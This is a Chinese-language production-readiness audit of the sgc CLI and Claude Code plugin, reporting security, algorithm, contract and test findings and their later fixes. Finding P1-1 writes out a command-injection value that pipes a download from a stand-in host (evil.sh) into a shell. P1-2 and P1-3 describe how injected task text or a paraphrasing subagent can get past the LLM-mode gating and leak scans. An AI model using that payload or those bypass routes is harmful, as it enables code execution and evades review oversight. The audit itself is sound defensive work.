# SGC 全面审核报告 — 架构 · 编排 · 算法 · 代码 · 契约 · 测试 · 四化 · 生产就绪

> 审核对象：`@sdsrs/sgc` **v1.31.8**（npm 包 + Claude Code marketplace 插件）
> 审核基线：`main @ 726daf4`（HEAD，工作树干净），审核日期 **2026-07-15**
> 审核方法：5 个独立子代理并行深查（架构编排 / 算法 / 代码质量安全 / 测试与生产就绪 / 契约一致性）+ 主审对全部 P1 级结论逐条亲证。以**代码 / 实测命令输出 / contracts 为权威**。证据强度标注：`[实测]`=主审本机命令执行 · `[主审复核]`=代理发现且主审读码亲证 · `[读证]`=代理读码验证。
> 与既有审核的关系：本报告是 `COMPREHENSIVE-AUDIT-v1.29.1.md`（基线 v1.29.1）与 `PRODUCTION-READINESS-AUDIT.md`（基线 v1.21.0）的当前版独立复核。**两份旧报告的全部 P0/P1 与 v1.29.1 报告的全部 P2 已逐条读码确认闭合**（见 §2），本报告不重复已闭合项；下文发现均为**新发现或旧报告未覆盖维度**。

---

> ## ✅ 回填：本审核已全量收口 —— 28 项 = 27 修复 + 1 误报（back-annotated 2026-07-15）
>
> 本文是 **v1.31.8 时点快照**，下文发现保留原样作历史记录。当前状态：**全部闭合**。
>
> - **P1（4 项）→ SHIPPED v1.32.0**：P1-1 `review.ts:74` 注入 argv 化 · P1-2 §8 契约名实对齐 · P1-3 分级器确定性下限 · P1-4 README 评分卡 4/6→5/9 + doctor 检查 (M) 防复发。
> - **P2（12 项）→ SHIPPED v1.32.0**：P2-1 测试隔离 · P2-2 doctor 工具链敏感性 · P2-3 js-yaml CVE · P2-4 §13 Tier-2 信号配对 · P2-5 file-lock 竞态 · P2-6 §3 stamp provenance · P2-7 applied 指标诚实化 · P2-8 词形匹配 · P2-9 dedup 加权 · P2-10 prompt 改 stdin · P2-11 openrouter 外发告知 · P2-12 Node 18 CI 背书。
> - **P3（12 项）→ 11 修复 + 1 误报**：P3-1 随 P2-3 顺带闭合于 v1.32.0；**P3-2…P3-10、P3-12 → SHIPPED v1.33.0**（agent 注册表诚实化 + doctor 检查 (N) 防复发 · SKILL.md 追上 v1.27.0 · L3 无终端快速失败 · `--submit` 接入 §1 泄漏扫描 · loop 全执行期加锁 · 真多进程锁测试 · publish 补 typecheck · files[] 裁剪 + events 轮转 · 三处计数文案 · cso 补 5 类密钥模式）；**P3-11 判定为审核误报**（见下）。
>
> **发版验收实证**：
> - **v1.32.0**（`e27681f`）：测试 1269 → **1339 pass / 0 fail**（+70）· `npm audit` 1 moderate → **0** · `sgc doctor` **65 OK / 0 fail** · CI 双绿 · 从 registry 实装验证：CVE 修复在位、argv-prompt 漏洞代码已消失、doctor 33 OK / 0 fail。
> - **v1.33.0**（`f20feb5`）：测试 → **1410 pass / 38 skip / 0 fail**（较审核基线 1269 **+141 回归测试**）· `sgc doctor` **66 OK / 0 warn / 0 fail**（新增检查 N）· `npm audit` **0** · CI 双绿 · npm 包 **529KB → 296KB（-44%）**、文件数 90 → 5 · 从 registry 实装 v1.33.0 验证：`src/` 确已不随包发出、doctor 34 OK / 0 fail。
>
> **本报告被修复过程推翻/修正的六处**（审核自身的错误，如实记录——无人纠正的审核会变成传说）：
> 1. **P2-2 由推断升为实证并改变了修复方向**：实测 bun 1.3.5（CI 锁定版）能字节复现提交的 bundle、1.3.11 不能 → 会话初的 `bundle STALE` 是**纯假阳性**，且其文案会诱导开发者提交让 CI 变红的产物。
> 2. **P2-8 的 `ui → build` 例子不成立**：`tokenize` 的 ASCII ≥3 长度下限已把 "ui" 滤出查询词；真实暴露面是 3 字符以上前缀型子串（auth→author、cat→category）。
> 3. **§4-12 关于 playwright 的表述不准确**：移入 `optionalDependencies` **不改变默认安装体积**（npm 默认仍装 optional 依赖），真实收益是 CDN 被墙时不再整体安装失败。
> 4. **P3-11 整条误报**（本报告最严重的自身错误）：本文断言"规范化指标信任自报 machine_enforced 而无校验"——实测推翻，**doctor 检查 G 早已在校验**（把 §8 的 test 引用改成不存在的文件 → 立刻 `✗ §8 cites missing test file(s)`；空 tests 列表同样被拦）。而"测试是否真的断言了该不变量"这层，`invariant-enforcement.yaml` 头部已明确声明不在校验范围——**契约本就诚实，是审核漏看了检查 G**。不做改动。
> 5. **P3-12 的第二半建议有害**：本文提议把 ">200KB 跳过"从 warn 升为 finding。现状已是 `warn`（非 pass，本文此处描述有误）；且本仓库自己 git-track 着 ~950KB 的 bundle，升级后 `sgc cso` 会在 sgc 自己身上**永远失败**——永远失败的门等于被忽略的门，严格劣于 warn。仅采纳"补密钥模式"那一半。
> 6. **P3-2 / P3-4 / P3-5 / P3-6 均低估了范围**：agent 元数据实际漂移 **10 个**而非本文点的 6 个；loop 无锁不只在 `--resume`（fresh-start 的锁只覆盖 [scan → writeRun]，两条路径的执行期都裸奔）；`--submit` 的泄漏风险比本文描述更重（§9 只校验字段形状、不看值内容）；L3 stdin 挂起仅在传 `--signed-by` 时发生（签名门在 stdin 门之前）。
>
> 逐项修复记录、实测证据与方法教训 → `docs/AUDIT-REMEDIATION-ROADMAP-v1.31.8.md`。

---

## 0. 结论速览

| 审核问题 | 结论 | 一句话依据 |
|---|---|---|
| 架构 / 编排系统科学合理性 | **总体科学，1 处名实不符**（A−） | 生成器/评估器分离四层纵深、原子写与锁真实、优雅降级完整；但不变量 §8 的"运行时越权即终止"承诺**无任何 wired 强制点**（P1-2） |
| 算法 | **主体严谨，1 处安全缺口 + 2 处度量诚实性问题**（B+） | dedup/tokenizer/fail-safe 归一化教科书级；但**分级器在 LLM 模式下无确定性下限**（P1-3），applied 指标存在自证循环 |
| 代码质量 / 安全 | **卫生良好，1 个注入点**（B+） | 全库 argv 化子进程、密钥零落盘零日志、ReDoS 全查为零；唯一 shell 插值 `review.ts:74` 构成命令注入（P1-1） |
| 测试 / 发布工程 | **远超同类，声明与门禁有 3 处脱节**（A−） | 1269 pass / 0 fail、断言锚定回归、bundle 新鲜度三重强制；但 node≥18 声明零 CI 覆盖、npm 安装 e2e 未接线、3 个测试对宿主工作树敏感 |
| 契约 / 文档诚实性 | **多数诚实，1 个可被用户一键证伪的数字**（B+） | 四化中 3 项与实测精确一致；但 README 自动化 **4/6 已过期（实测 5/9）**且恰好承诺"非手工维护"（P1-4） |
| **生产级使用水平** | **单操作者 CLI 场景：达到生产级，带 4 个应修 P1**；LLM 增强模式（配 API key）：**P1-3 修复前有真实的门禁旁路风险** | 硬指标全绿 + 两轮旧审核 P0/P1 全闭合；新 P1 全部可小步修复，无架构性返工 |

**整体判定**：sgc 相比 v1.29.1 时点**明显更成熟**——旧审核遗留问题闭合率 100%（P0/P1 级），dogfood 驱动的 1.30–1.31 系列修复真实可查。工程纪律（规范化）仍是最强项。本次审核的核心增量发现是一个共同模式：**"确定性护栏在 LLM 模式下退化为建议"**——分类器无启发式下限（P1-3）、§8 scope 仅提示词层面（P1-2）、reviewer agent 元数据超卖（P2-5）三者同根。这不是实现 bug，而是"信任 LLM 输出的边界"这一设计决策未被一致执行：代码库里已有正确范式（`compound.related` 永久启发式、Invariant §3 写门），只是没有推广到所有守门位。

---

## 1. 硬指标实测（本次执行，可复现）`[实测]`

| 命令 | 结果 |
|---|---|
| `tsc --noEmit` | **exit 0，干净** |
| `SGC_FORCE_INLINE=1 bun test tests/`（干净工作树） | **1269 pass / 38 skip / 0 fail**，3304 断言，103 文件，137s |
| 同上（工作树含 8 行未提交 diff 时） | **3 fail**（janitor 决策被宿主 diff 翻转，见 P2-1 测试隔离缺陷） |
| `bun src/sgc.ts doctor` | **63 OK · 0 warn · 1 fail**（bundle STALE——根因是 bun 版本敏感，见 P2-2，非源码真漂移） |
| `bun src/sgc.ts metrics` | 规范化 **12/13** · 智能化 **11/23** · 自动化 **5/9** · 高效化 1 步 / node≥18 / ~921KB |
| `npm audit` | **1 moderate**：js-yaml 4.1.1 二次复杂度 DoS（GHSA-h67p-54hq-rp68），修复版 4.3.0（P2-3） |
| 依赖状态 | 本机 node_modules 初始缺失；`npm install` 会改写 package-lock.json 根元数据（其停留在 **v1.18.0** 时代：bin=src/sgc.ts、engines=bun≥1.3，P3-1） |

**解读**：核心健康信号全绿。三个非绿信号（doctor 1 fail、audit 1 moderate、脏树 3 fail）各自成为本报告的 P2 发现——它们恰好都不在 CI 的可见面上（CI 树干净、bun 版本锁定 1.3.5、audit 不在门禁里）。

---

## 2. 旧审核闭合复核（先核对，再报新）

对 `PRODUCTION-READINESS-AUDIT.md`（v1.21.0 基线，27 项）与 `COMPREHENSIVE-AUDIT-v1.29.1.md`（12 项）逐条读码核对 `[读证]`：

- **全部 P0/HIGH 与 P1：CLOSED**，代码级证据确认（抽样：ALG-1 `dedup.ts:99-102` 空集=0；STAB-1 `file-lock.ts` O_EXCL + `plan-jobs.ts:255` 全临界区加锁；CE-2 `preventions.ts:94-110` 注入净化；P0-1 `tests/eval/eval-helpers.ts:26` FORCE_INLINE 生效；P2-7 `state.ts:823` 指纹缓存失效 + 回归测试）。
- **v1.29.1 报告全部 P2（P2-1…P2-8）：CLOSED**（banned-vocab 后置强制、OpenRouter 解析恢复、启发式↔LLM schema parity 测试、TTHW 测量脚本、automation 指标活化、fingerprint 失效等，均有对应测试文件）。
- **仍 OPEN（接受/推迟，均 P3 级）**：STAB-3（信号处理器仍 `process.exit`，writeAtomic 已限伤）、CE-6（solutions 无限增长，已加 256KB warn）、ALG-6/ALG-7（预处理器边界/签名折叠未 fuzz）、ARCH-3（contract schema 缓存不失效，单进程 CLI 下无害）。

这一闭合纪录本身是重要的正面证据：**该项目的审核→修复→回注（back-annotate）循环真实运转**，不是报告写完即死。

---

## 3. 新发现 — P1（4 项，均建议本周期内修复）

### P1-1 · 命令注入：`sgc review --base` 直接拼接 shell 字符串 `[主审复核]`
- `src/commands/review.ts:74`：`execSync(\`git diff ${base}\`)`，`base` 来自 CLI `--base` 参数，无任何校验。这是**全库唯一** shell 字符串插值点（其余 execSync 均为硬编码命令或 argv 数组，已逐一核对）。
- 失败场景：`sgc review --base 'HEAD; curl evil.sh | sh'` → 任意命令执行。单人交互使用属自伤，但本代码库自身就会从自动化里 spawn sgc 子命令（`plan-jobs.ts:332`）；任何 wrapper 把不可信 ref 传入 `--base` 即 RCE。
- 修复：改走 `spawnCapture(["git","diff",base])`（argv、无 shell），与全库既有风格一致，改动约 3 行。

### P1-2 · 不变量 §8 的"运行时终止"承诺无强制实现 `[主审复核]`
- `capabilities.ts:107-143` 定义的 `assertScope / assertCanSpawn / tokensAllow` 在派发路径上**零调用点**（grep 亲证：仅定义 + 测试引用）。spawn 时 scope token 只作为提示词文本注入（`spawn.ts:657` → `formatPrompt`），`spawn.ts:806` 注释自认"§1 + §8 advisory in LLM modes"。
- 但 `contracts/sgc-invariants.md §8` 的措辞是"越权文件访问/git 操作/spawn **导致立即终止**……在 dispatcher 层强制"。且两份契约文件互相矛盾：`invariant-enforcement.yaml` 对 §8 的描述（spawn-time scope computation）更诚实。
- 失败场景：LLM 模式下 reviewer 子代理 `cat .sgc/solutions/*.md` 把先例知识折进评审推理，无任何拦截；事后 `scanOutputForLeak`（`spawn.ts:811`）只抓逐字泄漏，改写复述即穿透——§1 遗忘评审的认识论保证被实质削弱。
- 修复二选一：接线一个强制 shim，或把 §8 契约措辞降级为与实现一致的"pin + advise + 事后扫描"。**任选其一都比现状好**——现状是最差的组合：强承诺 + 无实现。

### P1-3 · 分级器在 LLM 模式下无确定性升级下限——"门禁之门"纯靠一次 LLM 调用 `[主审复核]`
- `plan.ts:358`：`let level = classRes.output.level`，直接采信。有 API key 时 spawn 路由到 LLM（manifest `prompt_path: prompts/classifier-level.md`），**确定性启发式 `classifierLevelHeuristic` 只作为 inlineStub 存在、LLM 模式下永不运行**。HARD 升级规则（migration/DROP→L3，auth/payment→L2）在生产 LLM 路径上只存在于提示词里（advisory）。`validateOutputShape` 只校验枚举合法性，不校验 `level ≥ 启发式下限`。唯一下限 `--forceLevel` 是操作者手工升级。
- 注意：v1.31.8 刚刚加强了启发式的 `SECURITY_KEYWORDS`（CHANGELOG 亲证），但**加强的是一个在 LLM 模式下不运行的函数**——修了刀刃、没装刀柄。
- 失败场景："run the DB migration to drop the legacy sessions table"，LLM 因任务描述里夹带的诱导文本（或单纯误判）返回 L0 → `plan.ts:378,403` 跳过 planner 集群、对抗性 pre-mortem、review+qa 门禁、motivation 强制——**整套安全架构的开关掌握在一次无下限的 LLM 输出手里**。
- 修复：始终运行启发式并取 `level = max(heuristic, llm)`。代码库对 `compound.related` 已经采用了完全相同的纪律（`agents/compound.ts:140-157` 拒绝 LLM 化以保 §3 写门），把该范式推广到分级器即可，低风险小改。

### P1-4 · README 自动化评分卡过期且恰好违背自己的"机器生成"承诺 `[实测]`
- `README.md:120` 与 `docs/ROADMAP.md:21` 写 **自动化 4/6**，且 README 明言"These numbers are produced by `sgc metrics`… not hand-maintained"并邀请用户复现。实测 `sgc metrics` 输出 **5/9**（CE 知识弧计入后的新口径，`metrics.ts:63-73`），`metrics/metrics-baseline.yaml` 亦为 5/9。
- 这是**用户一条命令即可证伪**的宣称——对一个把"诚实指标"当卖点的项目，这类漂移伤害超过其技术含量。其余三项四化数字实测精确一致（规范化 12/13、智能化 11/23、高效化 1 步）。
- 修复：README/ROADMAP 两处改 5/9；建议顺手加一个 doctor 检查（README 数字 ↔ metrics 输出 parity），杜绝复发。

---

## 4. 新发现 — P2（选列 12 项）

**编排与状态层**
1. **测试隔离缺陷：janitor 决策读宿主仓库 diff** `[实测]` — `ship.ts:111` `gitDiffLineCount()` 无 cwd，测试中统计的是 sgc 仓库自身的 `git diff`。工作树有 <20 行未提交改动时 3 个测试翻红（本次实测复现并于恢复干净树后确认 30/30 过）。CI 恒绿掩盖此缺陷。修复：测试注入 `diffLineCount`，或让 runShip 显式接收 cwd。
2. **doctor bundle-parity 对 bun 版本敏感** `[实测]` — 本机 bun 1.3.11 重建 hash ≠ CI（锁定 1.3.5）产物 → 误报 STALE fail。校验应记录/比对构建工具链版本，或在版本不一致时降级为 warn 并说明。
3. **js-yaml 4.1.1 moderate CVE 已内联进已发布 bundle** `[实测]` — GHSA-h67p-54hq-rp68（merge-key 二次复杂度 DoS）；解析对象主要是自有 contracts 与本地 state，可利用性低，但发布物含已知 CVE 代码。修复：`npm audit fix`（→4.3.0）+ rebuild + 发版。
4. **§13 Tier-2 事件在 SIGINT/SIGTERM 下不配对** `[读证]` — 信号 drain（`spawn.ts:209`）合成 Tier-1 `spawn.end` 但不合成 `llm.response`，`process.exit` 令 agent 层 finally 不执行 → Ctrl-C 时 `llm.request` 落单，恰是 §13 要防的审计洞。
5. **file-lock 陈锁回收存在 unlink-by-path 竞态** `[读证]` — `file-lock.ts:103` 按路径 unlink 检查过的死锁文件，窗口内競争者已重建有效锁则被误删 → 双持锁 → 重现 STAB-1 要消灭的孤儿 planner。pid-in-filename 或 recreate-and-verify 可闭。
6. **DedupStamp 门不校验引用的 spawn 存在** `[读证]` — `state.ts:727` 只查非空字符串，错误信息却声称"must reference an on-disk spawn"；伪造 stamp 可过 §3 写门（当前唯一调用方合法，暴露面低）。

**算法与度量诚实性**
7. **`applied_count` 自证循环** `[读证]` — `applied-tracker.ts:95-118` 把"对抗性 LLM 在输出里复读了输入给它的 prevention ref"计为"最强复用信号（L3-validated）"。输出对输入匹配，可被提示词复读习惯单调抬高。应改标签或改锚独立信号（ref 出现在最终 diff/测试里）。
8. **`researcher.history` 相关性打分子串过匹配** `[读证]` — `researcher-history.ts:157` 对语料做原始 `includes`（`ui` 命中 `build`、`auth` 命中 `author`），假阳性抬高 relevance → 污染 prior-art 注入并抬高 surfaced/applied 指标。应对语料同法分词做词集交。
9. **dedup 相似度中 tag 噪声与 problem 信号等权** `[读证]` — `dedup.ts:147-151` 两分量均权：problem 完全相同 + tag 半异（tag 本身来自 13 词子串启发式，天然噪）→ 0.75 < 0.85 → 真重复照写。建议 problem-Jaccard 加权。

**安全与暴露面**
10. **claude-cli 模式整段 prompt 走 argv** `[读证]` — `claude-cli-agent.ts:155`，共享主机上 `/proc/<pid>/cmdline` 可被同机用户读取（含 diff/代码内容），且大 prompt 有 ARG_MAX 风险。应改 stdin 管道。
11. **OpenRouter 第三方外发仅代码注释披露** `[读证]` — 设了 `OPENROUTER_API_KEY` 即自动把代码/diff 发往 openrouter.ai（`spawn.ts:440-442`），无运行时提示。对以"评审专有代码"为业的工具，应有一次性显式告知或 opt-in。

**发布工程**
12. **可安装性声明缺 CI 背书** `[读证]` — node≥18 声明只在 Node 24 上测（`test.yml:23`）；`tests/e2e/npm-isolated-install.test.sh` 存在但未接进任何 workflow；playwright 位于 `dependencies`（非 optional），全局安装触发数百 MB chromium postinstall，而浏览器 QA 本是 opt-in 且代码已惰性 import（`playwright-runner.ts:173`）。三者共同点：**承诺存在、门禁缺位**。

---

## 5. 新发现 — P3（选列）

| # | 发现 | 位置 |
|---|---|---|
| 1 | package-lock.json 根元数据停留 v1.18.0（version/bin/engines 全旧值），`npm install` 即产生 8 行噪声 diff（并触发 P2-1 的测试翻红——两缺陷会串联） | package-lock.json `[实测]` |
| 2 | reviewer agent 描述超卖（LLM 可见元数据）：`agents/reviewer/security.md` 自称 "OWASP Top 10" 级评审，运行时是关键词正则；`adversarial/spec` 为 slot-only 未实现却无标注。plugins/CLAUDE.md 与 capabilities.yaml 有诚实注记，但**路由器读的恰是超卖的那份** | plugins/sgc/agents/reviewer/*.md `[读证]`（本项按本仓库自身 L3 元数据标准应视为 P2.5） |
| 3 | `skills/review/SKILL.md` 仍写 "L3 specialists" 与 "not yet wired"——与已 ship 的 L2+ 集群（v1.27.0，`review.ts:267-274`）直接矛盾；`review.ts:11` 头注释同病 | `[读证]` |
| 4 | loop 的 L3 步会挂在交互 stdin 门上（未传 readConfirmation），无人值守循环变 hang；应非 TTY 快速失败 | `loop.ts:228` → `plan.ts:755` `[读证]` |
| 5 | `agent-loop --submit` 外部提交路径跳过 §1 泄漏扫描（正常 file-poll 路径有覆盖，防御纵深不对称） | `agent-loop.ts:114` `[读证]` |
| 6 | `loop --resume` 无锁（fresh-start 有）；双 resume 同 id 会重复执行步骤 | `loop.ts:313` `[读证]` |
| 7 | writeAtomic 无 fsync（rename 只保证可见性原子、不保证掉电持久），且无 crash-mid-write 测试；file-lock 无真多进程并发测试 | `state.ts:174-193` `[读证]` |
| 8 | publish 门禁薄于 push 门禁（publish.yml 只跑 dispatcher 测试，无 typecheck/eval） | `.github/workflows/publish.yml` `[读证]` |
| 9 | `files[]` 发运死重（src/ + contracts/ + prompts/，bundle 已自含）；events.ndjson 无轮转上限 | package.json / logger.ts `[读证]` |
| 10 | README "citty CLI (19 subcommands)" 实为 20；invariants §10 prose "five subagents" 实为 4+janitor；classifier prompt 声称的 scope 比 manifest 多一个 token | `[读证]` |
| 11 | 规范化指标信任 YAML 自报 `machine_enforced: true`，无测试存在性佐证 | `metrics.ts:31-38` `[读证]` |
| 12 | cso 秘密扫描仅覆盖 git 跟踪文件 + 200KB 上限，模式集缺 Stripe/JWT/Google key（作为末道门可接受，已正确不回显匹配值） | `cso.ts:105-203` `[读证]` |

---

## 6. 编排系统科学性评估（正面清单，均有代码证据）

用户问"整个编排系统科学合理不"——**合理，且多处达到教科书水准**：

1. **生成器/评估器分离四层纵深**：spawn 时禁止 token 拒绝（`capabilities.ts:85` throw ScopeViolation）→ 消费侧后门输入门（`spawn.ts:317`，先于 spawn.start 抛出以保事件配对）→ 生产侧剥离 → 全模式事后泄漏扫描（`spawn.ts:811`）。
2. **原子写正确**：pid+时间戳+单调序号+4 随机字节 tmp → rename → 失败 unlink（`state.ts:174-193`）。
3. **O_EXCL 文件锁包住完整临界区**（scan→fork→writeJob，`plan-jobs.ts:255`），配注入式活性检测的测试。
4. **fail-safe 方向一致正确**：未知 LLM verdict 归一为 `reject`（`fuse-plan.ts:57-66`）；janitor 默认 skip（漏沉淀可恢复、污染语料不可恢复）；`compound.related` 拒绝 LLM 化以保 §3 写门——这是全库最好的一条设计决策。
5. **降级阶梯完整且可解释**：FORCE_INLINE → anthropic → openrouter → inline stub → claude CLI → file-poll，无 key 无 CLI 在插件环境下快速失败并给出 3 选项提示（`spawn.ts:688-700`）。
6. **§10 compound 天然事务边界**：writeSolution 是唯一且最后的状态变更，任何前置抛出=零写入，无需 bolted-on 回滚。
7. **信号 drain**：SIGINT/SIGTERM 先收割子进程/fetch，再合成 `spawn.end(interrupted)`，Tier-1 事件配对在中断下成立（Tier-2 见 P2-4）。
8. **测试纪律**：断言锚定具体回归（`similarity(∅,∅)===0`、重试延迟 `[1000,2000,4000]`）、确定性故障注入（时钟/睡眠/rng/liveness 全注入）、ship 门禁走真实 plan→ship 管线而非 mock。
9. **依赖分层无环**：dispatcher→commands 零静态 import（懒加载断环，亲证 grep）。
10. **知识闭环真实**：capture（ship-failure/canary/red-green 模板化捕获）→ promote（dedup 0.85 门 + 签名 stamp）→ reuse（prior-art 注入 planner.adversarial）→ reflect（surfaced/applied 审计），每环有代码与测试。

**结构性短板一句话**：并行多视角 + 末端确定性聚合（ensemble + 约束器）的编排选型对成本正确；真正需要收敛的是上文 P1-2/P1-3 所代表的"LLM 输出信任边界"一致性，而非编排拓扑本身。

---

## 7. 四化重评（v1.31.8，主审独立评定）

| 化 | v1.29.1 评 | 本次评 | 变化依据 |
|---|---|---|---|
| 规范化 | A | **A−** | 12/13 机器强制仍真实；扣分项是本次揭示的 §8 承诺无实现（P1-2）与 §13 信号路径洞（P2-4）——"机器强制"的含金量需以强制点真实接线为准 |
| 自动化 | B | **B+（数字过期）** | 口径从 4/6 诚实扩展为 5/9（CE 弧计入），指标活化（P2-5 闭合）；扣分项恰是 README 未跟上自己的进步（P1-4） |
| 智能化 | B− | **B−** | 容量 11/23 未变、真 LLM 驱动仍约 5 个；新增扣分：唯一全程 LLM 决策的守门位（分级器）反而是唯一没有确定性下限的（P1-3）——智能化的正确方向是"LLM 提议、确定性裁决"，当前恰好倒置 |
| 高效化 | C+ | **B−** | TTHW 已实测（P2-4 闭合，`scripts/measure-tthw.sh`）、1 步安装真实；扣分：playwright 硬依赖的数百 MB postinstall 与"轻量安装"体感相悖（§4-12） |

---

## 8. 生产级判定

- **单操作者本地 CLI（当前主用形态，无 API key / FORCE_INLINE）**：✅ **生产级**。1269/0 测试、tsc 干净、旧审核 P0/P1 全闭、降级路径完整。P1-1 注入在此形态下是自伤面，P1-3 不触发（无 key 时启发式即主路径）。
- **LLM 增强模式（设 ANTHROPIC/OPENROUTER key）**：⚠️ **P1-3 修复前有保留**。分级即门禁开关，无下限的 LLM 分级使 L3 任务可能滑过全部对抗性审查；叠加 §8 advisory（P1-2），"不变量强制"的宣传语在此模式下需要打折理解。两项都是小改动。
- **共享主机 / 多用户环境**：⚠️ P2-10（argv prompt 暴露）修复前不建议处理敏感代码。
- **团队并发场景**：与 v1.21.0 审核结论一致——文件锁已存在且正确（含 P2-5 的窄竞态），但缺真多进程验证（P3-7），审慎使用。

---

## 9. 修复路线建议（按杠杆排序）

**本周期（P1，全部为小改动）**
1. `review.ts:74` → argv 化（3 行，唯一注入点）。
2. 分级器接确定性下限：`level = max(classifierLevelHeuristic, llm)`（复用既有函数，照抄 `compound.related` 范式）。
3. §8 二选一：接线 `assertScope` 强制 shim，或降级 `sgc-invariants.md §8` 措辞与 `invariant-enforcement.yaml` 对齐。
4. README/ROADMAP 自动化 4/6 → 5/9，并加 doctor parity 检查防复发。

**下一周期（P2 高杠杆组）**
5. `npm audit fix`（js-yaml 4.3.0）+ 锁文件根元数据刷新（顺带消 P3-1）+ rebuild 发版。
6. 测试注入 diffLineCount 消宿主敏感性；doctor bundle-parity 记录 bun 版本。
7. Tier-2 事件信号配对（drain 中合成 llm.response）；file-lock 回收改 recreate-and-verify。
8. `applied` 指标改锚独立信号或诚实改名；researcher.history 改词集交。
9. claude-cli prompt 改 stdin；OpenRouter 外发加运行时一次性告知。
10. playwright → optionalDependencies；npm-install e2e 接入 CI；test.yml 加 Node 18 矩阵格。

**持续（P3）**：reviewer agent 元数据加 heuristic 注记 + doctor 绑定 agents/**.md ↔ manifest；SKILL.md L2+ 措辞更新；loop L3 非 TTY 快速失败；publish 门禁补 typecheck。

---

## 10. 审核方法与局限

- 5 代理并行 + 主审对全部 P1 亲证（P1-1/2/3/4 均主审读码或实测复核）；P2/P3 采信代理读码证据，抽样复核未发现虚报。
- 未做：真实 LLM 模式的端到端行为测试（38 个 key-gated eval 本次 skip）、多进程压力测试、npm 消费端真实安装验证——后两者本身即是发现（P3-7、§4-12）。
- 本审核在读码外仅执行只读命令与 `npm install`（结束后已 `git checkout package-lock.json` 恢复原状，工作树未留改动）。
